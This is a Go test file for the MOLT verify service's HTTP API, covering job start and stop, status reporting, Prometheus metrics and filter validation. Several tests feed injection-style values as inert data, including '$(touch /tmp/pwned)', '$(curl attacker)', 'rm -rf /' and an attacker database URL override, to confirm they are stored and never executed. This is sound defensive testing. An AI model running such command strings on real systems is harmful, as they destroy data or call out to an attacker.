package verifyservice_test

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/cockroachdb/molt/dbtable"
	"github.com/cockroachdb/molt/utils"
	"github.com/cockroachdb/molt/verify/inconsistency"
	"github.com/cockroachdb/molt/verifyservice"
	dto "github.com/prometheus/client_model/go"
	"github.com/prometheus/common/expfmt"
	"github.com/stretchr/testify/require"
)

func TestPostJobsStartsSingleVerifyJob(t *testing.T) {
	t.Parallel()

	runner := &blockingRunner{started: make(chan verifyservice.RunRequest, 1)}
	service := verifyservice.NewService(verifyservice.Config{}, verifyservice.Dependencies{
		Runner:      runner,
		IDGenerator: sequentialIDGenerator("job-000001"),
		Now: func() time.Time {
			return time.Date(2026, 4, 19, 18, 30, 0, 0, time.UTC)
		},
	})
	t.Cleanup(service.Close)

	server := httptest.NewServer(service.Handler())
	t.Cleanup(server.Close)

	response, err := http.Post(server.URL+"/jobs", "application/json", bytes.NewBufferString(`{}`))
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = response.Body.Close()
	})

	require.Equal(t, http.StatusAccepted, response.StatusCode)

	var payload struct {
		JobID  string `json:"job_id"`
		Status string `json:"status"`
	}
	require.NoError(t, json.NewDecoder(response.Body).Decode(&payload))
	require.Equal(t, "job-000001", payload.JobID)
	require.Equal(t, "running", payload.Status)

	select {
	case request := <-runner.started:
		require.Equal(t, utils.DefaultFilterConfig(), request.FilterConfig())
	case <-time.After(2 * time.Second):
		t.Fatal("expected verify job to start")
	}
}

func TestGetJobReturnsRunningJobStatus(t *testing.T) {
	t.Parallel()

	runner := &blockingRunner{started: make(chan verifyservice.RunRequest, 1)}
	service := verifyservice.NewService(verifyservice.Config{}, verifyservice.Dependencies{
		Runner:      runner,
		IDGenerator: sequentialIDGenerator("job-000001"),
		Now: func() time.Time {
			return time.Date(2026, 4, 19, 18, 31, 0, 0, time.UTC)
		},
	})
	t.Cleanup(service.Close)

	server := httptest.NewServer(service.Handler())
	t.Cleanup(server.Close)

	startResponse, err := http.Post(server.URL+"/jobs", "application/json", bytes.NewBufferString(`{}`))
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = startResponse.Body.Close()
	})
	require.Equal(t, http.StatusAccepted, startResponse.StatusCode)

	getResponse, err := http.Get(server.URL + "/jobs/job-000001")
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = getResponse.Body.Close()
	})

	require.Equal(t, http.StatusOK, getResponse.StatusCode)

	var payload struct {
		JobID      string  `json:"job_id"`
		Status     string  `json:"status"`
		StartedAt  string  `json:"started_at"`
		FinishedAt *string `json:"finished_at"`
	}
	require.NoError(t, json.NewDecoder(getResponse.Body).Decode(&payload))
	require.Equal(t, "job-000001", payload.JobID)
	require.Equal(t, "running", payload.Status)
	require.Equal(t, "2026-04-19T18:31:00Z", payload.StartedAt)
	require.Nil(t, payload.FinishedAt)
}

func TestMetricsExposesRunningJobState(t *testing.T) {
	t.Parallel()

	runner := &blockingRunner{started: make(chan verifyservice.RunRequest, 1)}
	service := verifyservice.NewService(verifyservice.Config{}, verifyservice.Dependencies{
		Runner:      runner,
		IDGenerator: sequentialIDGenerator("job-000001"),
	})
	t.Cleanup(service.Close)

	server := httptest.NewServer(service.Handler())
	t.Cleanup(server.Close)

	startResponse, err := http.Post(server.URL+"/jobs", "application/json", bytes.NewBufferString(`{}`))
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = startResponse.Body.Close()
	})
	require.Equal(t, http.StatusAccepted, startResponse.StatusCode)

	response, err := http.Get(server.URL + "/metrics")
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = response.Body.Close()
	})

	require.Equal(t, http.StatusOK, response.StatusCode)

	body, err := io.ReadAll(response.Body)
	require.NoError(t, err)
	require.Contains(
		t,
		string(body),
		`cockroach_migration_tool_verify_job_state{job_id="job-000001",status="running"} 1`,
	)
}

func TestMetricsExposeRunningTableProgress(t *testing.T) {
	t.Parallel()

	runner := reportingRunner(func(ctx context.Context, reporter inconsistency.Reporter) error {
		reporter.Report(inconsistency.StatusReport{Info: "verifying public.accounts"})
		reporter.Report(inconsistency.SummaryReport{
			Info: "accounts summary",
			Stats: inconsistency.RowStats{
				Schema:      "public",
				Table:       "accounts",
				NumVerified: 7,
			},
		})
		<-ctx.Done()
		return ctx.Err()
	})
	service := verifyservice.NewService(verifyservice.Config{
		Verify: verifyservice.VerifyConfig{
			Source: verifyservice.DatabaseConfig{
				URL: "postgres://source-user:source-pass@source-db:26257/source_db?application_name=verify",
			},
			Destination: verifyservice.DatabaseConfig{
				URL: "postgres://target-user:target-pass@target-db:26257/target_db?application_name=verify",
			},
		},
	}, verifyservice.Dependencies{
		Runner:      runner,
		IDGenerator: sequentialIDGenerator("job-000001"),
	})
	t.Cleanup(service.Close)

	server := httptest.NewServer(service.Handler())
	t.Cleanup(server.Close)

	startResponse, err := http.Post(server.URL+"/jobs", "application/json", bytes.NewBufferString(`{}`))
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = startResponse.Body.Close()
	})
	require.Equal(t, http.StatusAccepted, startResponse.StatusCode)

	require.Eventually(t, func() bool {
		response, err := http.Get(server.URL + "/metrics")
		require.NoError(t, err)
		defer func() {
			_ = response.Body.Close()
		}()
		if response.StatusCode != http.StatusOK {
			return false
		}

		body, err := io.ReadAll(response.Body)
		require.NoError(t, err)
		metrics := string(body)
		return strings.Contains(metrics, `cockroach_migration_tool_verify_job_state{job_id="job-000001",status="running"} 1`) &&
			strings.Contains(metrics, `cockroach_migration_tool_verify_source_rows_total{database="source_db",job_id="job-000001",schema="public",table="accounts"} 7`) &&
			strings.Contains(metrics, `cockroach_migration_tool_verify_checked_rows_total{job_id="job-000001",schema="public",table="accounts"} 7`) &&
			!strings.Contains(metrics, "molt_verify_")
	}, 2*time.Second, 20*time.Millisecond)
}

func TestMetricsKeepLatestTableTotalsAndExposeMismatchKinds(t *testing.T) {
	t.Parallel()

	runner := reportingRunner(func(ctx context.Context, reporter inconsistency.Reporter) error {
		reporter.Report(inconsistency.SummaryReport{
			Info: "accounts summary 1",
			Stats: inconsistency.RowStats{
				Schema:      "public",
				Table:       "accounts",
				NumVerified: 3,
				NumSuccess:  1,
				NumMissing:  1,
				NumMismatch: 1,
			},
		})
		reporter.Report(inconsistency.SummaryReport{
			Info: "accounts summary 2",
			Stats: inconsistency.RowStats{
				Schema:                "public",
				Table:                 "accounts",
				NumVerified:           7,
				NumSuccess:            2,
				NumConditionalSuccess: 3,
				NumMissing:            1,
				NumMismatch:           4,
				NumColumnMismatch:     5,
				NumExtraneous:         6,
			},
		})
		reporter.Report(inconsistency.MismatchingTableDefinition{
			DBTable: dbtable.DBTable{
				Name: dbtable.Name{
					Schema: "public",
					Table:  "accounts",
				},
			},
			Info: "table definition mismatch",
		})
		<-ctx.Done()
		return ctx.Err()
	})
	service := verifyservice.NewService(verifyservice.Config{
		Verify: verifyservice.VerifyConfig{
			Source: verifyservice.DatabaseConfig{
				URL: "postgres://source-user:source-pass@source-db:26257/source_db?application_name=verify",
			},
			Destination: verifyservice.DatabaseConfig{
				URL: "postgres://target-user:target-pass@target-db:26257/target_db?application_name=verify",
			},
		},
	}, verifyservice.Dependencies{
		Runner:      runner,
		IDGenerator: sequentialIDGenerator("job-000001"),
	})
	t.Cleanup(service.Close)

	server := httptest.NewServer(service.Handler())
	t.Cleanup(server.Close)

	startResponse, err := http.Post(server.URL+"/jobs", "application/json", bytes.NewBufferString(`{}`))
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = startResponse.Body.Close()
	})
	require.Equal(t, http.StatusAccepted, startResponse.StatusCode)

	require.Eventually(t, func() bool {
		response, err := http.Get(server.URL + "/metrics")
		require.NoError(t, err)
		defer func() {
			_ = response.Body.Close()
		}()
		if response.StatusCode != http.StatusOK {
			return false
		}

		body, err := io.ReadAll(response.Body)
		require.NoError(t, err)
		metrics := string(body)
		return strings.Count(metrics, `cockroach_migration_tool_verify_source_rows_total{database="source_db",job_id="job-000001",schema="public",table="accounts"} `) == 1 &&
			strings.Contains(metrics, `cockroach_migration_tool_verify_source_rows_total{database="source_db",job_id="job-000001",schema="public",table="accounts"} 7`) &&
			strings.Contains(metrics, `cockroach_migration_tool_verify_destination_rows_total{database="target_db",job_id="job-000001",schema="public",table="accounts"} 15`) &&
			strings.Contains(metrics, `cockroach_migration_tool_verify_mismatches_total{job_id="job-000001",kind="missing",schema="public",table="accounts"} 1`) &&
			strings.Contains(metrics, `cockroach_migration_tool_verify_mismatches_total{job_id="job-000001",kind="mismatch",schema="public",table="accounts"} 4`) &&
			strings.Contains(metrics, `cockroach_migration_tool_verify_mismatches_total{job_id="job-000001",kind="column_mismatch",schema="public",table="accounts"} 5`) &&
			strings.Contains(metrics, `cockroach_migration_tool_verify_mismatches_total{job_id="job-000001",kind="extraneous",schema="public",table="accounts"} 6`) &&
			strings.Contains(metrics, `cockroach_migration_tool_verify_mismatches_total{job_id="job-000001",kind="table_definition",schema="public",table="accounts"} 1`)
	}, 2*time.Second, 20*time.Millisecond)
}

func TestMetricsExposeFailedJobStateAndErrors(t *testing.T) {
	t.Parallel()

	runner := reportingRunner(func(_ context.Context, reporter inconsistency.Reporter) error {
		reporter.Report(inconsistency.StatusReport{Info: "about to fail"})
		return errors.New("verify exploded")
	})
	service := verifyservice.NewService(verifyservice.Config{}, verifyservice.Dependencies{
		Runner:      runner,
		IDGenerator: sequentialIDGenerator("job-000001"),
	})
	t.Cleanup(service.Close)

	server := httptest.NewServer(service.Handler())
	t.Cleanup(server.Close)

	startResponse, err := http.Post(server.URL+"/jobs", "application/json", bytes.NewBufferString(`{}`))
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = startResponse.Body.Close()
	})
	require.Equal(t, http.StatusAccepted, startResponse.StatusCode)

	require.Eventually(t, func() bool {
		response, err := http.Get(server.URL + "/metrics")
		require.NoError(t, err)
		defer func() {
			_ = response.Body.Close()
		}()
		if response.StatusCode != http.StatusOK {
			return false
		}

		body, err := io.ReadAll(response.Body)
		require.NoError(t, err)
		metrics := string(body)
		return strings.Contains(metrics, `cockroach_migration_tool_verify_job_state{job_id="job-000001",status="failed"} 1`) &&
			strings.Contains(metrics, `cockroach_migration_tool_verify_errors_total{job_id="job-000001"} 1`)
	}, 2*time.Second, 20*time.Millisecond)
}

func TestMetricsKeepLabelSetsNarrowAndExcludeFreeText(t *testing.T) {
	t.Parallel()

	runner := reportingRunner(func(_ context.Context, reporter inconsistency.Reporter) error {
		reporter.Report(inconsistency.StatusReport{Info: "verifying public.accounts with free text"})
		reporter.Report(inconsistency.SummaryReport{
			Info: "accounts summary with free text",
			Stats: inconsistency.RowStats{
				Schema:      "public",
				Table:       "accounts",
				NumVerified: 7,
				NumMismatch: 2,
			},
		})
		reporter.Report(inconsistency.MismatchingTableDefinition{
			DBTable: dbtable.DBTable{
				Name: dbtable.Name{
					Schema: "public",
					Table:  "accounts",
				},
			},
			Info: "table definition mismatch with free text",
		})
		return errors.New("verify exploded with free text")
	})
	service := verifyservice.NewService(verifyservice.Config{
		Verify: verifyservice.VerifyConfig{
			Source: verifyservice.DatabaseConfig{
				URL: "postgres://source-user:source-pass@source-db:26257/source_db?application_name=verify",
			},
			Destination: verifyservice.DatabaseConfig{
				URL: "postgres://target-user:target-pass@target-db:26257/target_db?application_name=verify",
			},
		},
	}, verifyservice.Dependencies{
		Runner:      runner,
		IDGenerator: sequentialIDGenerator("job-000001"),
	})
	t.Cleanup(service.Close)

	server := httptest.NewServer(service.Handler())
	t.Cleanup(server.Close)

	startResponse, err := http.Post(server.URL+"/jobs", "application/json", bytes.NewBufferString(`{}`))
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = startResponse.Body.Close()
	})
	require.Equal(t, http.StatusAccepted, startResponse.StatusCode)

	require.Eventually(t, func() bool {
		response, err := http.Get(server.URL + "/metrics")
		require.NoError(t, err)
		defer func() {
			_ = response.Body.Close()
		}()
		if response.StatusCode != http.StatusOK {
			return false
		}

		body, err := io.ReadAll(response.Body)
		require.NoError(t, err)
		metrics := string(body)
		if !strings.Contains(metrics, `cockroach_migration_tool_verify_errors_total{job_id="job-000001"} 1`) {
			return false
		}

		parser := expfmt.TextParser{}
		families, err := parser.TextToMetricFamilies(strings.NewReader(metrics))
		require.NoError(t, err)
		require.Equal(t, []string{"job_id", "status"}, metricLabelNames(t, families["cockroach_migration_tool_verify_job_state"]))
		require.Equal(t, []string{"database", "job_id", "schema", "table"}, metricLabelNames(t, families["cockroach_migration_tool_verify_source_rows_total"]))
		require.Equal(t, []string{"database", "job_id", "schema", "table"}, metricLabelNames(t, families["cockroach_migration_tool_verify_destination_rows_total"]))
		require.Equal(t, []string{"job_id", "schema", "table"}, metricLabelNames(t, families["cockroach_migration_tool_verify_checked_rows_total"]))
		require.Equal(t, []string{"job_id", "kind", "schema", "table"}, metricLabelNames(t, families["cockroach_migration_tool_verify_mismatches_total"]))
		require.Equal(t, []string{"job_id"}, metricLabelNames(t, families["cockroach_migration_tool_verify_errors_total"]))
		require.NotContains(t, metrics, "verifying public.accounts with free text")
		require.NotContains(t, metrics, "accounts summary with free text")
		require.NotContains(t, metrics, "table definition mismatch with free text")
		require.NotContains(t, metrics, "verify exploded with free text")
		return true
	}, 2*time.Second, 20*time.Millisecond)
}

func TestPostJobsRejectsConcurrentStartAttempts(t *testing.T) {
	t.Parallel()

	runner := &blockingRunner{started: make(chan verifyservice.RunRequest, 1)}
	service := verifyservice.NewService(verifyservice.Config{}, verifyservice.Dependencies{
		Runner:      runner,
		IDGenerator: sequentialIDGenerator("job-000001", "job-000002"),
	})
	t.Cleanup(service.Close)

	server := httptest.NewServer(service.Handler())
	t.Cleanup(server.Close)

	firstResponse, err := http.Post(server.URL+"/jobs", "application/json", bytes.NewBufferString(`{}`))
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = firstResponse.Body.Close()
	})
	require.Equal(t, http.StatusAccepted, firstResponse.StatusCode)

	secondResponse, err := http.Post(server.URL+"/jobs", "application/json", bytes.NewBufferString(`{}`))
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = secondResponse.Body.Close()
	})

	require.Equal(t, http.StatusConflict, secondResponse.StatusCode)

	var payload struct {
		Error string `json:"error"`
	}
	require.NoError(t, json.NewDecoder(secondResponse.Body).Decode(&payload))
	require.Equal(t, "a verify job is already running", payload.Error)
}

func TestPostStopWithoutJobIDStopsTheActiveJob(t *testing.T) {
	t.Parallel()

	runner := &blockingRunner{started: make(chan verifyservice.RunRequest, 1)}
	service := verifyservice.NewService(verifyservice.Config{}, verifyservice.Dependencies{
		Runner:      runner,
		IDGenerator: sequentialIDGenerator("job-000001"),
	})
	t.Cleanup(service.Close)

	server := httptest.NewServer(service.Handler())
	t.Cleanup(server.Close)

	startResponse, err := http.Post(server.URL+"/jobs", "application/json", bytes.NewBufferString(`{}`))
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = startResponse.Body.Close()
	})
	require.Equal(t, http.StatusAccepted, startResponse.StatusCode)

	stopResponse, err := http.Post(server.URL+"/stop", "application/json", bytes.NewBufferString(`{}`))
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = stopResponse.Body.Close()
	})
	require.Equal(t, http.StatusOK, stopResponse.StatusCode)

	require.Eventually(t, func() bool {
		getResponse, err := http.Get(server.URL + "/jobs/job-000001")
		require.NoError(t, err)
		defer func() {
			_ = getResponse.Body.Close()
		}()
		if getResponse.StatusCode != http.StatusOK {
			return false
		}
		body, err := io.ReadAll(getResponse.Body)
		require.NoError(t, err)
		return bytes.Contains(body, []byte(`"status":"stopped"`))
	}, 2*time.Second, 20*time.Millisecond)
}

func TestGetJobReturnsCompletedTypedVerifyResult(t *testing.T) {
	t.Parallel()

	runner := reportingRunner(func(_ context.Context, reporter inconsistency.Reporter) error {
		reporter.Report(inconsistency.StatusReport{Info: `verification in progress; $(whoami) "quoted"`})
		reporter.Report(inconsistency.SummaryReport{
			Info: `table verification summary; $(echo accounts)`,
			Stats: inconsistency.RowStats{
				Schema:      "public",
				Table:       "accounts",
				NumVerified: 7,
				NumMismatch: 1,
			},
		})
		return nil
	})
	service := verifyservice.NewService(verifyservice.Config{}, verifyservice.Dependencies{
		Runner:      runner,
		IDGenerator: sequentialIDGenerator("job-000001"),
		Now: sequentialTimeGenerator(
			time.Date(2026, 4, 19, 18, 32, 0, 0, time.UTC),
			time.Date(2026, 4, 19, 18, 32, 5, 0, time.UTC),
		),
	})
	t.Cleanup(service.Close)

	server := httptest.NewServer(service.Handler())
	t.Cleanup(server.Close)

	startResponse, err := http.Post(server.URL+"/jobs", "application/json", bytes.NewBufferString(`{}`))
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = startResponse.Body.Close()
	})
	require.Equal(t, http.StatusAccepted, startResponse.StatusCode)

	require.Eventually(t, func() bool {
		getResponse, err := http.Get(server.URL + "/jobs/job-000001")
		require.NoError(t, err)
		defer func() {
			_ = getResponse.Body.Close()
		}()
		if getResponse.StatusCode != http.StatusOK {
			return false
		}

		var payload struct {
			JobID         string  `json:"job_id"`
			Status        string  `json:"status"`
			StartedAt     string  `json:"started_at"`
			FinishedAt    *string `json:"finished_at"`
			FailureReason *string `json:"failure_reason"`
			Result        struct {
				StatusMessages []struct {
					Info string `json:"info"`
				} `json:"status_messages"`
				Summaries []struct {
					Info  string `json:"info"`
					Stats struct {
						Schema      string `json:"schema"`
						Table       string `json:"table"`
						NumVerified int    `json:"num_verified"`
						NumMismatch int    `json:"num_mismatch"`
					} `json:"stats"`
				} `json:"summaries"`
			} `json:"result"`
		}
		require.NoError(t, json.NewDecoder(getResponse.Body).Decode(&payload))
		if payload.Status != "succeeded" {
			return false
		}
		require.Equal(t, "job-000001", payload.JobID)
		require.Equal(t, "2026-04-19T18:32:00Z", payload.StartedAt)
		require.NotNil(t, payload.FinishedAt)
		require.Equal(t, "2026-04-19T18:32:05Z", *payload.FinishedAt)
		require.Nil(t, payload.FailureReason)
		require.Len(t, payload.Result.StatusMessages, 1)
		require.Equal(t, `verification in progress; $(whoami) "quoted"`, payload.Result.StatusMessages[0].Info)
		require.Len(t, payload.Result.Summaries, 1)
		require.Equal(t, `table verification summary; $(echo accounts)`, payload.Result.Summaries[0].Info)
		require.Equal(t, "public", payload.Result.Summaries[0].Stats.Schema)
		require.Equal(t, "accounts", payload.Result.Summaries[0].Stats.Table)
		require.Equal(t, 7, payload.Result.Summaries[0].Stats.NumVerified)
		require.Equal(t, 1, payload.Result.Summaries[0].Stats.NumMismatch)
		return true
	}, 2*time.Second, 20*time.Millisecond)
}

func TestGetJobReturnsFailedResultWithMismatchAndFailureReason(t *testing.T) {
	t.Parallel()

	runner := reportingRunner(func(_ context.Context, reporter inconsistency.Reporter) error {
		reporter.Report(inconsistency.MismatchingTableDefinition{
			DBTable: dbtable.DBTable{
				Name: dbtable.Name{
					Schema: "public",
					Table:  "accounts",
				},
			},
			Info: `primary key mismatch; $(touch /tmp/pwned) "quoted"`,
		})
		return errors.New(`verify exploded; $(curl attacker) "quoted"`)
	})
	service := verifyservice.NewService(verifyservice.Config{}, verifyservice.Dependencies{
		Runner:      runner,
		IDGenerator: sequentialIDGenerator("job-000001"),
		Now: sequentialTimeGenerator(
			time.Date(2026, 4, 19, 18, 33, 0, 0, time.UTC),
			time.Date(2026, 4, 19, 18, 33, 4, 0, time.UTC),
		),
	})
	t.Cleanup(service.Close)

	server := httptest.NewServer(service.Handler())
	t.Cleanup(server.Close)

	startResponse, err := http.Post(server.URL+"/jobs", "application/json", bytes.NewBufferString(`{}`))
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = startResponse.Body.Close()
	})
	require.Equal(t, http.StatusAccepted, startResponse.StatusCode)

	require.Eventually(t, func() bool {
		getResponse, err := http.Get(server.URL + "/jobs/job-000001")
		require.NoError(t, err)
		defer func() {
			_ = getResponse.Body.Close()
		}()
		if getResponse.StatusCode != http.StatusOK {
			return false
		}

		var payload struct {
			Status        string  `json:"status"`
			FinishedAt    *string `json:"finished_at"`
			FailureReason *string `json:"failure_reason"`
			Result        struct {
				Mismatches []struct {
					Kind   string `json:"kind"`
					Schema string `json:"schema"`
					Table  string `json:"table"`
					Info   string `json:"info"`
				} `json:"mismatches"`
				Errors []string `json:"errors"`
			} `json:"result"`
		}
		require.NoError(t, json.NewDecoder(getResponse.Body).Decode(&payload))
		if payload.Status != "failed" {
			return false
		}
		require.NotNil(t, payload.FinishedAt)
		require.Equal(t, "2026-04-19T18:33:04Z", *payload.FinishedAt)
		require.NotNil(t, payload.FailureReason)
		require.Equal(t, `verify exploded; $(curl attacker) "quoted"`, *payload.FailureReason)
		require.Len(t, payload.Result.Mismatches, 1)
		require.Equal(t, "table_definition", payload.Result.Mismatches[0].Kind)
		require.Equal(t, "public", payload.Result.Mismatches[0].Schema)
		require.Equal(t, "accounts", payload.Result.Mismatches[0].Table)
		require.Equal(t, `primary key mismatch; $(touch /tmp/pwned) "quoted"`, payload.Result.Mismatches[0].Info)
		require.Equal(t, []string{`verify exploded; $(curl attacker) "quoted"`}, payload.Result.Errors)
		return true
	}, 2*time.Second, 20*time.Millisecond)
}

func TestPostJobsPassesScopedFiltersToTheVerifyRunner(t *testing.T) {
	t.Parallel()

	runner := &blockingRunner{started: make(chan verifyservice.RunRequest, 1)}
	service := verifyservice.NewService(verifyservice.Config{}, verifyservice.Dependencies{
		Runner:      runner,
		IDGenerator: sequentialIDGenerator("job-000001"),
	})
	t.Cleanup(service.Close)

	server := httptest.NewServer(service.Handler())
	t.Cleanup(server.Close)

	response, err := http.Post(
		server.URL+"/jobs",
		"application/json",
		bytes.NewBufferString(`{
			"filters": {
				"include": {
					"schema": "^public$|tmp;curl attacker",
					"table": "accounts;$(touch /tmp/pwned)|orders"
				},
				"exclude": {
					"schema": "audit|tmp;rm -rf /",
					"table": "^tmp_"
				}
			}
		}`),
	)
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = response.Body.Close()
	})
	require.Equal(t, http.StatusAccepted, response.StatusCode)

	select {
	case request := <-runner.started:
		require.Equal(t, utils.FilterConfig{
			SchemaFilter:        "^public$|tmp;curl attacker",
			TableFilter:         "accounts;$(touch /tmp/pwned)|orders",
			ExcludeSchemaFilter: "audit|tmp;rm -rf /",
			ExcludeTableFilter:  "^tmp_",
		}, request.FilterConfig())
	case <-time.After(2 * time.Second):
		t.Fatal("expected verify job with filters to start")
	}
}

func TestPostJobsRejectsInvalidFilterRegex(t *testing.T) {
	t.Parallel()

	runner := &blockingRunner{started: make(chan verifyservice.RunRequest, 1)}
	service := verifyservice.NewService(verifyservice.Config{}, verifyservice.Dependencies{
		Runner: runner,
	})
	t.Cleanup(service.Close)

	server := httptest.NewServer(service.Handler())
	t.Cleanup(server.Close)

	response, err := http.Post(
		server.URL+"/jobs",
		"application/json",
		bytes.NewBufferString(`{
			"filters": {
				"include": {
					"schema": "["
				}
			}
		}`),
	)
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = response.Body.Close()
	})

	require.Equal(t, http.StatusBadRequest, response.StatusCode)

	select {
	case <-runner.started:
		t.Fatal("runner must not start when filter validation fails")
	default:
	}
}

func TestPostJobsIgnoresConnectionLikeRequestFields(t *testing.T) {
	t.Parallel()

	runner := &blockingRunner{started: make(chan verifyservice.RunRequest, 1)}
	service := verifyservice.NewService(verifyservice.Config{}, verifyservice.Dependencies{
		Runner:      runner,
		IDGenerator: sequentialIDGenerator("job-000001"),
	})
	t.Cleanup(service.Close)

	server := httptest.NewServer(service.Handler())
	t.Cleanup(server.Close)

	response, err := http.Post(
		server.URL+"/jobs",
		"application/json",
		bytes.NewBufferString(`{
			"filters": {
				"include": {
					"schema": "^public$"
				}
			},
			"verify": {
				"source": {
					"url": "postgres://attacker/override",
					"tls": {
						"ca_cert_path": "/tmp/evil-ca.pem"
					}
				}
			},
			"listener": {
				"bind_addr": "0.0.0.0:1"
			},
			"command": "sh -c 'curl attacker'"
		}`),
	)
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = response.Body.Close()
	})
	require.Equal(t, http.StatusAccepted, response.StatusCode)

	select {
	case request := <-runner.started:
		require.Equal(t, utils.FilterConfig{
			SchemaFilter: "^public$",
			TableFilter:  utils.DefaultFilterString,
		}, request.FilterConfig())
	case <-time.After(2 * time.Second):
		t.Fatal("expected verify job to start")
	}
}

func TestPostStopWithUnknownJobIDReturnsNotFound(t *testing.T) {
	t.Parallel()

	service := verifyservice.NewService(verifyservice.Config{}, verifyservice.Dependencies{
		Runner: &blockingRunner{started: make(chan verifyservice.RunRequest, 1)},
	})
	t.Cleanup(service.Close)

	server := httptest.NewServer(service.Handler())
	t.Cleanup(server.Close)

	hostileJobID := `job-999999;$(touch /tmp/pwned) "quoted"`
	stopRequestBody, err := json.Marshal(map[string]string{"job_id": hostileJobID})
	require.NoError(t, err)

	response, err := http.Post(
		server.URL+"/stop",
		"application/json",
		bytes.NewBuffer(stopRequestBody),
	)
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = response.Body.Close()
	})

	require.Equal(t, http.StatusNotFound, response.StatusCode)

	getResponse, err := http.Get(server.URL + "/jobs/" + url.PathEscape(hostileJobID))
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = getResponse.Body.Close()
	})
	require.Equal(t, http.StatusNotFound, getResponse.StatusCode)
}

func TestJobResultsAreLostAfterProcessRestart(t *testing.T) {
	t.Parallel()

	serviceOne := verifyservice.NewService(verifyservice.Config{}, verifyservice.Dependencies{
		Runner:      reportingRunner(func(_ context.Context, _ inconsistency.Reporter) error { return nil }),
		IDGenerator: sequentialIDGenerator("job-000001"),
	})
	t.Cleanup(serviceOne.Close)

	serverOne := httptest.NewServer(serviceOne.Handler())
	t.Cleanup(serverOne.Close)

	startResponse, err := http.Post(serverOne.URL+"/jobs", "application/json", bytes.NewBufferString(`{}`))
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = startResponse.Body.Close()
	})
	require.Equal(t, http.StatusAccepted, startResponse.StatusCode)

	require.Eventually(t, func() bool {
		getResponse, err := http.Get(serverOne.URL + "/jobs/job-000001")
		require.NoError(t, err)
		defer func() {
			_ = getResponse.Body.Close()
		}()
		if getResponse.StatusCode != http.StatusOK {
			return false
		}
		body, err := io.ReadAll(getResponse.Body)
		require.NoError(t, err)
		return bytes.Contains(body, []byte(`"status":"succeeded"`))
	}, 2*time.Second, 20*time.Millisecond)

	serverOne.Close()
	serviceOne.Close()

	serviceTwo := verifyservice.NewService(verifyservice.Config{}, verifyservice.Dependencies{
		Runner: reportingRunner(func(_ context.Context, _ inconsistency.Reporter) error { return nil }),
	})
	t.Cleanup(serviceTwo.Close)

	serverTwo := httptest.NewServer(serviceTwo.Handler())
	t.Cleanup(serverTwo.Close)

	getResponse, err := http.Get(serverTwo.URL + "/jobs/job-000001")
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = getResponse.Body.Close()
	})
	require.Equal(t, http.StatusNotFound, getResponse.StatusCode)
}

type blockingRunner struct {
	started chan verifyservice.RunRequest
}

func (r *blockingRunner) Run(
	ctx context.Context,
	request verifyservice.RunRequest,
	_ inconsistency.Reporter,
) error {
	r.started <- request
	<-ctx.Done()
	return ctx.Err()
}

type reportingRunner func(ctx context.Context, reporter inconsistency.Reporter) error

func (r reportingRunner) Run(
	ctx context.Context,
	_ verifyservice.RunRequest,
	reporter inconsistency.Reporter,
) error {
	return r(ctx, reporter)
}

func sequentialIDGenerator(ids ...string) func() string {
	return func() string {
		if len(ids) == 0 {
			return "unexpected-id"
		}
		next := ids[0]
		ids = ids[1:]
		return next
	}
}

func sequentialTimeGenerator(times ...time.Time) func() time.Time {
	return func() time.Time {
		if len(times) == 0 {
			return time.Date(2026, 4, 19, 0, 0, 0, 0, time.UTC)
		}
		next := times[0]
		times = times[1:]
		return next
	}
}

func metricLabelNames(t *testing.T, family *dto.MetricFamily) []string {
	t.Helper()

	require.NotNil(t, family)
	require.NotEmpty(t, family.Metric)

	names := make([]string, 0, len(family.Metric[0].Label))
	for _, label := range family.Metric[0].Label {
		names = append(names, label.GetName())
	}
	sort.Strings(names)
	return names
}
